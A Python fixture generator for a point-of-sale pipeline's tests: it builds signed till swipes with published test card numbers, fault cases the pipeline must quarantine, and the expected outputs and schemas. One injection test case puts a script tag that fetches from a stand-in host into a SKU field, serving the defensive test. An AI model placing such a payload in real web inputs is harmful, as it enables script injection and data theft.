#!/usr/bin/env -S uv run -s
# /// script
# requires-python = ">=3.11"
# dependencies = []
# ///
"""The fixture swipes for the one-shot proof run, and what each must become.

`fixtures/swipes.json` is what the tills put in the store database: raw
terminal records signed with an enrolled till key, plus the faults the
pipeline must stop. `fixtures/expected.json` is what the warehouse, the
quarantine file and the window display must end up holding.

The expectations are computed here in plain Python from the swipe and the
store profile, with the central side's own `jid1` implementation, never by
reading what the pipeline produced, so a pipeline bug cannot hide behind
its own output. The keys are fixture constants that protect nothing; the
card numbers are the card networks' published test numbers.

    uv run -s scripts/fixtures.py            # rewrite fixtures/*.json
    uv run -s scripts/fixtures.py --check    # fail if they are out of date
"""

from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import json
import re
import subprocess
import sys
from pathlib import Path
from zoneinfo import ZoneInfo

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import stores  # noqa: E402

JOIN_ID_KEY = "fixture-join-key-demo-retail-pos-edge"
REGISTER_KEY_SEED = "fixture-register-seed-demo-retail-pos-edge"
FIXTURE_STORES = ("s1", "s2")
CAPTURE_DELAY_S = 1.5
PERSONAL = ["pan", "track2", "cvv", "expiry", "cardholder", "auth_code", "cashier",
            "loyalty_email"]

# The card networks' published test numbers, one per shopper.
SHOPPERS = {
    "ana": {"pan": "4111111111111111", "brand": "visa", "name": "BAKKER/A",
            "expiry": "2812", "cvv": "123", "email": "ana.bakker@example.net"},
    "ben": {"pan": "5555555555554444", "brand": "mastercard", "name": "VISSER/B",
            "expiry": "2906", "cvv": "456", "email": None},
    "chloe": {"pan": "378282246310005", "brand": "amex", "name": "WEBER/C",
              "expiry": "3011", "cvv": "7890", "email": None},
}

TELEMETRY_TEMP_C = {"s1": 21.4}   # s2 has no climate sensor: "sensor missing"
HEARTBEATS = {
    "s1": {"s1-r1": ("open", 0), "s1-r2": ("closed", 0), "s1-r3": ("open", -60)},
    "s2": {"s2-r1": ("open", 0)},
}
ROSTER = {"s1-r1": "ok", "s1-r2": "closed", "s1-r3": "silent",
          "s2-r1": "ok", "s2-r2": "closed"}


# Everything whose change can change what the pipelines produce. The proof
# report and the explorer data carry this digest; `just test` fails when it
# no longer matches the tree, so neither can go stale unnoticed.
DIGEST_INPUTS = [
    "pipelines/pos-guard.yaml", "pipelines/pos-uplink.yaml", "config/stores.json",
    "scripts/stores.py", "scripts/warehouse.py", "scripts/pki.py", "scripts/fixtures.py",
    "scripts/fixture_run.py", "fixtures/swipes.json", "fixtures/expected.json",
    "fixtures/replay/guard.input.jsonl", "fixtures/replay/uplink.input.jsonl",
    "fixtures/replay/guard.expected.schema.json", "fixtures/replay/uplink.expected.schema.json",
    "fixtures/replay/config/register-keys.json", "fixtures/replay/config/join-id-key.txt",
    "fixtures/replay/config/store-profile.json", "fixtures/replay/config/store-catalog.json",
]


def inputs_digest() -> dict:
    files = {name: hashlib.sha256((ROOT / name).read_bytes()).hexdigest()
             for name in DIGEST_INPUTS}
    whole = hashlib.sha256("".join(f"{k}:{v}\n" for k, v in sorted(files.items())).encode())
    return {"sha256": whole.hexdigest(), "files": files}


def git_revision() -> dict:
    def git(*args: str) -> str:
        return subprocess.run(["git", "-C", str(ROOT), *args], capture_output=True,
                              text=True).stdout.strip()
    return {"commit": git("rev-parse", "HEAD"), "short": git("rev-parse", "--short", "HEAD"),
            "dirty": bool(git("status", "--porcelain", "--", *DIGEST_INPUTS))}


def config() -> dict:
    return json.loads((ROOT / "config" / "stores.json").read_text())


def store_profile(store_id: str) -> dict:
    return next(s for s in config()["stores"] if s["store_id"] == store_id)


def register_keys(store_id: str) -> dict[str, str]:
    store = store_profile(store_id)
    return {r: stores.register_key(REGISTER_KEY_SEED, r) for r in stores.register_ids(store)}


def sign(register_id: str, rec: dict) -> str:
    reg = stores.Register.__new__(stores.Register)
    reg.key = stores.register_key(REGISTER_KEY_SEED, register_id)
    return reg.sign(rec)


def raw_swipe(txn: str, register_id: str, ts: str, shopper: str, items: list[dict],
              note: str = "", entry: str = "contactless", total: int | None = None) -> dict:
    s = SHOPPERS[shopper]
    rec = {
        "txn_id": txn, "register_id": register_id, "ts": ts, "pan": s["pan"],
        "track2": f"{s['pan']}={s['expiry']}101123456789", "cvv": s["cvv"],
        "expiry": s["expiry"], "cardholder": s["name"], "card_brand": s["brand"],
        "entry_mode": entry, "auth_code": "A7K2QZ",
        "cashier": "OP07", "items": items,
        "total_cents": sum(i["qty"] * i["unit_cents"] for i in items) if total is None else total,
        "currency": "EUR", "note": note,
    }
    if s["email"]:
        rec["loyalty_email"] = s["email"]
    rec["sig"] = sign(register_id, rec)
    return rec


def item(sku: str, qty: int = 1) -> dict:
    _, name, category, cents, _ = next(c for c in stores.CATALOG if c[0] == sku)
    return {"sku": sku, "qty": qty, "unit_cents": cents}


def epoch(ts: str) -> float:
    return dt.datetime.fromisoformat(ts.replace("Z", "+00:00")).timestamp()


def cases() -> list[dict]:
    """Every swipe with how it is built; expectations come from expected()."""
    out: list[dict] = []

    def add(case_id: str, title: str, store: str, rec: dict, late_s: float = CAPTURE_DELAY_S) -> None:
        out.append({"id": case_id, "title": title, "store": store,
                    "captured_at": round(epoch(rec["ts"]) + late_s, 3), "record": rec})

    t = "2026-10-05T09:%02d:%02d.000Z"
    add("clean-hot-drinks", "A clean sale: two flat whites and a croissant", "s1",
        raw_swipe("s1-r1-fixture-00001", "s1-r1", t % (15, 2), "ana",
                  [item("HD-01", 2), item("BK-01")]))
    add("clean-cold-drinks", "A clean sale: iced latte and lemonade", "s1",
        raw_swipe("s1-r2-fixture-00002", "s1-r2", t % (15, 9), "ben",
                  [item("CD-01"), item("CD-03")], entry="chip"))
    add("clean-same-card-other-store", "The same card at another store, which has no climate sensor",
        "s2", raw_swipe("s2-r1-fixture-00003", "s2-r1", t % (15, 14), "ana",
                        [item("SW-01"), item("SN-02")]))
    add("clean-three-lines", "A clean sale with three product lines", "s2",
        raw_swipe("s2-r1-fixture-00004", "s2-r1", t % (15, 21), "chloe",
                  [item("IC-01"), item("CD-02"), item("SN-01", 2)], entry="swipe"))
    add("clean-bakery", "A clean sale: a sourdough loaf", "s1",
        raw_swipe("s1-r1-fixture-00005", "s1-r1", t % (15, 30), "chloe", [item("BK-02")]))
    add("clean-sandwiches", "A clean sale: two cheese sandwiches", "s2",
        raw_swipe("s2-r1-fixture-00006", "s2-r1", t % (15, 36), "ben", [item("SW-02", 2)]))

    tamper = raw_swipe("s1-r1-fixture-00007", "s1-r1", t % (15, 44), "ben",
                       [item("HD-02"), item("BK-01")])
    tamper["items"][0]["unit_cents"] = 1  # altered after signing, totals still add up
    tamper["total_cents"] = sum(i["qty"] * i["unit_cents"] for i in tamper["items"])
    add("tampered", "A price changed after the till signed it", "s1", tamper)

    spaced = " ".join(SHOPPERS["ana"]["pan"][i:i + 4] for i in range(0, 16, 4))
    add("card-number-in-note", "A signed swipe with the card number typed into its note", "s2",
        raw_swipe("s2-r1-fixture-00008", "s2-r1", t % (15, 51), "ana", [item("HD-03")],
                  note=f"card {spaced} declined once, retried"))

    malformed = raw_swipe("s1-r3-fixture-00009", "s1-r3", t % (15, 58), "chloe", [item("SN-01")])
    del malformed["pan"]
    malformed["items"][0]["qty"] = "two"
    add("malformed", "A swipe with no card number and a quantity of \"two\"", "s1", malformed)

    inject = raw_swipe("s2-r1-fixture-00010", "s2-r1", t % (16, 5), "ben", [item("SN-01")])
    inject["items"][0]["sku"] = "<script>fetch('//x.example/k')</script>"
    inject["sig"] = sign("s2-r1", inject)
    add("injection", "A correctly signed swipe with a script in the SKU", "s2", inject)

    add("stale-replay", "A swipe captured 400 seconds after it was signed", "s1",
        raw_swipe("s1-r2-fixture-00011", "s1-r2", t % (16, 12), "ana", [item("CD-01")]),
        late_s=400)

    add("unknown-register", "A swipe from a register that is not enrolled here", "s1",
        raw_swipe("s1-r9-fixture-00012", "s1-r9", t % (16, 19), "ben", [item("HD-01")]))

    mismatch = raw_swipe("s2-r1-fixture-00013", "s2-r1", t % (16, 26), "chloe",
                         [item("HD-01"), item("BK-01")], total=700)
    add("totals-mismatch", "Lines add to 550 cents; the receipt says 700", "s2", mismatch)

    add("over-limit", "A signed total over the 5,000.00 limit", "s1",
        raw_swipe("s1-r1-fixture-00014", "s1-r1", t % (16, 33), "ana",
                  [{"sku": "BK-02", "qty": 1, "unit_cents": 600000}]))
    return out


QUARANTINE_REASON = {
    "tampered": "signature mismatch: altered after the register signed it",
    "card-number-in-note": "card number blocked: raw card number in note",
    "malformed": "malformed: missing pan",
    "injection": "injection pattern in a text field",
    "stale-replay": "stale: ",
    "unknown-register": "unknown register: not enrolled here",
    "totals-mismatch": "totals: items add to 550, receipt says 700",
    "over-limit": "range: total over limit",
}


def expected_clean(case: dict) -> dict:
    rec, sid = case["record"], case["store"]
    profile = store_profile(sid)
    zone = ZoneInfo(profile["tz"])
    when = dt.datetime.fromisoformat(rec["ts"].replace("Z", "+00:00")).astimezone(zone)
    catalog = {sku: (name, category) for sku, name, category, _, _ in stores.CATALOG}
    temp = TELEMETRY_TEMP_C.get(sid)
    return {
        "basket": [{"category": catalog[i["sku"]][1], "name": catalog[i["sku"]][0],
                    "qty": i["qty"], "sku": i["sku"], "unit_cents": i["unit_cents"]}
                   for i in rec["items"]],
        "card_brand": rec["card_brand"],
        "context": {
            "country": profile["country"], "district": profile["district"],
            "hour": when.hour, "lat": profile["lat"],
            "local_time": when.isoformat(timespec="seconds"), "lon": profile["lon"],
            "register_id": rec["register_id"],
            "sensor": "ok" if temp is not None else "sensor missing",
            "store_id": sid, "store_name": profile["name"],
            "temp_c": temp, "weekday": when.strftime("%A"),
        },
        "currency": rec["currency"], "entry_mode": rec["entry_mode"],
        "join_id": stores.join_id(JOIN_ID_KEY, rec["pan"]),
        "note": rec["note"],
        "stripped": [f for f in PERSONAL if f in rec],
        "total_cents": rec["total_cents"], "txn_id": rec["txn_id"],
        "uplink": {"store_id": sid},
    }


def expected_quarantine(case: dict) -> dict:
    rec = case["record"]
    digits = "".join("•" if ch.isdigit() else ch for ch in rec.get("note", ""))
    return {
        "note": digits, "reason_starts_with": QUARANTINE_REASON[case["id"]],
        "register_id": rec.get("register_id", "unknown"), "store_id": case["store"],
        "total_cents": rec.get("total_cents"), "txn_id": rec.get("txn_id", "unknown"),
    }


def expected_window(all_cases: list[dict]) -> dict:
    """Units sold per category and store across every clean sale."""
    catalog = {sku: category for sku, _, category, _, _ in stores.CATALOG}
    out: dict[str, dict[str, int]] = {sid: {} for sid in FIXTURE_STORES}
    for case in all_cases:
        if case["id"].startswith("clean"):
            for line in case["record"]["items"]:
                cat = catalog[line["sku"]]
                out[case["store"]][cat] = out[case["store"]].get(cat, 0) + line["qty"]
    return out


def build() -> tuple[dict, dict]:
    all_cases = cases()
    swipes = {
        "about": "Raw till records as the store database holds them. Keys are fixture "
                 "constants that protect nothing; card numbers are the networks' test numbers.",
        "join_id_key": JOIN_ID_KEY, "register_key_seed": REGISTER_KEY_SEED,
        "stores": list(FIXTURE_STORES),
        "heartbeats": {sid: {r: {"state": s, "age_s": a} for r, (s, a) in beats.items()}
                       for sid, beats in HEARTBEATS.items()},
        "climate_temp_c": TELEMETRY_TEMP_C,
        "cases": all_cases,
    }
    expected = {
        "about": "What the pipelines must produce, computed from the swipes in plain Python "
                 "(scripts/fixtures.py), never from pipeline output.",
        "volatile": ["edge_at", "uplink.queued_at", "context.sensor_at"],
        "warehouse": {c["id"]: expected_clean(c) for c in all_cases if c["id"].startswith("clean")},
        "quarantine": {c["id"]: expected_quarantine(c) for c in all_cases
                       if not c["id"].startswith("clean")},
        "roster": ROSTER,
        "window_units": expected_window(all_cases),
        "totals": {"swipes": len(all_cases),
                   "clean": sum(c["id"].startswith("clean") for c in all_cases),
                   "quarantined": sum(not c["id"].startswith("clean") for c in all_cases)},
    }
    return swipes, expected


# ------------------------------------------------------------- shared replay
# The shared public-bar check replays each job from a file of JSON lines to a
# file, with no environment. These are its inputs and the schemas its output
# must satisfy, built from the same oracle as the proof run. Store s1 only:
# the replay uses one store's configuration, and s2 is covered by the proof run.

REPLAY_STORE = "s1"


def replay_config() -> dict[str, str]:
    """The store configuration directory the replay's default POS_CONFIG_DIR points at."""
    catalog = {sku: {"name": n, "category": c} for sku, n, c, _, _ in stores.CATALOG}
    profile = {k: store_profile(REPLAY_STORE)[k]
               for k in ("store_id", "name", "district", "country", "tz", "lat", "lon")}
    return {
        "register-keys.json": json.dumps(register_keys(REPLAY_STORE), indent=2) + "\n",
        "join-id-key.txt": JOIN_ID_KEY + "\n",
        "store-profile.json": json.dumps(profile, indent=2) + "\n",
        "store-catalog.json": json.dumps(catalog, indent=2) + "\n",
    }


def lines(items: list[dict]) -> str:
    return "".join(json.dumps(i, ensure_ascii=False) + "\n" for i in items)


def guard_clean_output(case: dict) -> dict:
    """What pos-guard emits for a clean swipe when no sensor has reported."""
    out = expected_clean(case)
    del out["uplink"]
    out["context"].update(sensor="sensor missing", temp_c=None, sensor_at=None)
    return out


def const_object(value: dict, loose: dict[str, dict]) -> dict:
    """A closed schema: every key must be present, fixed values are const."""
    props = {k: {"const": v} for k, v in value.items() if k not in loose}
    props.update(loose)
    return {"type": "object", "additionalProperties": False, "required": sorted(props),
            "properties": props}


TIMESTAMP = {"type": "string", "minLength": 20}


def guard_schema(replay_cases: list[dict]) -> dict:
    wanted = []
    for case in replay_cases:
        if case["id"].startswith("clean"):
            rec = guard_clean_output(case)
            context = const_object(rec["context"], {})
            schema = const_object({k: v for k, v in rec.items() if k != "context"},
                                  {"context": context, "edge_at": TIMESTAMP})
        else:
            want = expected_quarantine(case)
            schema = const_object(
                {"note": want["note"], "register_id": want["register_id"],
                 "total_cents": want["total_cents"], "txn_id": want["txn_id"]},
                {"quarantined_at": TIMESTAMP, "store_id": {"type": ["string", "null"]},
                 "reason": {"type": "string",
                            "pattern": "^" + re.escape(want["reason_starts_with"])},
                 "reasons": {"type": "array", "minItems": 1, "items": {"type": "string"}}})
        wanted.append({"contains": schema})
    return {"$schema": "https://json-schema.org/draft/2020-12/schema",
            "title": "pos-guard replay output", "type": "array",
            "minItems": len(wanted), "maxItems": len(wanted), "allOf": wanted}


def uplink_schema(clean_outputs: list[dict]) -> dict:
    wanted = []
    for rec in clean_outputs:
        schema = const_object({k: v for k, v in rec.items()},
                              {"uplink": const_object({}, {
                                  "store_id": {"type": ["string", "null"]},
                                  "queued_at": TIMESTAMP})})
        wanted.append({"contains": schema})
    return {"$schema": "https://json-schema.org/draft/2020-12/schema",
            "title": "pos-uplink replay output", "type": "array",
            "minItems": len(wanted), "maxItems": len(wanted), "allOf": wanted}


def replay_files(all_cases: list[dict]) -> dict[str, str]:
    mine = [c for c in all_cases if c["store"] == REPLAY_STORE]
    clean = [guard_clean_output(c) for c in mine if c["id"].startswith("clean")]
    for rec in clean:
        rec["edge_at"] = "2026-10-05T09:16:00.000000+00:00"
    files = {f"fixtures/replay/config/{name}": text for name, text in replay_config().items()}
    files["fixtures/replay/guard.input.jsonl"] = lines(
        [{"captured_at": c["captured_at"], "record": c["record"]} for c in mine])
    files["fixtures/replay/guard.expected.schema.json"] = render(guard_schema(mine))
    files["fixtures/replay/uplink.input.jsonl"] = lines(clean)
    files["fixtures/replay/uplink.expected.schema.json"] = render(uplink_schema(clean))
    return files


def render(obj: dict) -> str:
    return json.dumps(obj, indent=2, ensure_ascii=False) + "\n"


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--check", action="store_true")
    args = ap.parse_args()
    swipes, expected = build()
    files = {ROOT / "fixtures" / "swipes.json": render(swipes),
             ROOT / "fixtures" / "expected.json": render(expected)}
    files.update({ROOT / name: text for name, text in replay_files(swipes["cases"]).items()})
    if args.check:
        stale = [str(p.relative_to(ROOT)) for p, text in files.items()
                 if not p.exists() or p.read_text() != text]
        if stale:
            print(f"out of date: {', '.join(stale)} (run scripts/fixtures.py)", file=sys.stderr)
            return 1
        print(f"ok: fixtures match their generator ({len(swipes['cases'])} swipes)")
        return 0
    for path, text in files.items():
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    print(f"wrote {len(files)} files, {len(swipes['cases'])} swipes")
    return 0


if __name__ == "__main__":
    sys.exit(main())
